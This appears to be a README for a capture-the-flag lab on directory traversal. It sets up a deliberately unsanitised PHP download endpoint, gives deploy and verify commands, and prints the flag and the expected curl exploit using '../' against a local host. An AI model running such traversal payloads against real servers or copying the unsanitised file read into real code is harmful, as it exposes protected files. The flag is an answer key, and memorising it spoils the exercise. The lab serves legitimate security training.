# dir-traversal — Directory/Path Traversal

**Vulnerability:** Apache serves files via a `?file=` parameter without path sanitisation  
**Tool:** `curl`  
**Flag:** `WMG{d1r_trav3rs4l_n0_s4n1t1z3d_p4ths}`

## Scenario

Caldwell & Webb runs a document server at `/download.php?file=<filename>`.
The parameter is passed directly to PHP's `file_get_contents()` with no
sanitisation. A `../` traversal escapes the web root and reaches
`/var/www/html/secrets/flag.txt`, which is blocked by a 403 when accessed
directly but readable via traversal from the download endpoint.

## Deploy

```bash
ansible-playbook -i inventory/hosts.ini games/dir-traversal/setup.yml
```

First run: `ok=13 changed=9`  
Second run: `ok=12 changed=1` (Apache restart is intentional)

## Verify

```bash
./agent-harness/verify.sh dir-traversal
```

## Expected exploit

```bash
# Direct access is blocked:
curl -o /dev/null -w "%{http_code}" http://127.0.0.1/secrets/flag.txt
# → 403

# Path traversal succeeds:
curl http://127.0.0.1/download.php?file=../secrets/flag.txt
# → WMG{d1r_trav3rs4l_n0_s4n1t1z3d_p4ths}
```

## Training

`training.json` — 9 levels: web enumeration → endpoint discovery → traversal theory → payload crafting → flag retrieval → ASSESSMENT.  
MITRE ATT&CK: T1083 (File and Directory Discovery), T1190 (Exploit Public-Facing Application).  
CyberRangeCZ subnet: 10.1.30.0/24
